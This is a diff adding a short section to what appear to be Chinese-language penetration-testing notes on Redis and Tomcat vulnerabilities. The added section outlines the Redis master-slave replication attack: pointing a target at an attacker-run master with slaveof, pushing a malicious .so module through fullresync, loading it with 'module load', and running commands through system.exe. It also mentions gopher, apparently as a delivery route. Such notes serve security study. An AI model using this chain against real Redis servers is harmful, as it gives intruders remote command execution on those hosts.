@@ -414,6 +414,33 @@ OK
 OK
 ```
 
+#### 主从复制
+
+```sh
+#主机
+slaveof 192.168.21.246 6379 设置从机
+
+get key
+
+#从机
+redis-cli -h 192.168.21.246 -p 6379
+
+get key 
+
+
+主机写so文件
+
+僚机-->fullresync 同步
+
+​		-->module load 加载so文件
+
+​		-->system.exe
+
+
+```
+
+gopher
+
 ### Tomcat漏洞
 
 轻量应用服务器，与Apache独立的进程单独运行
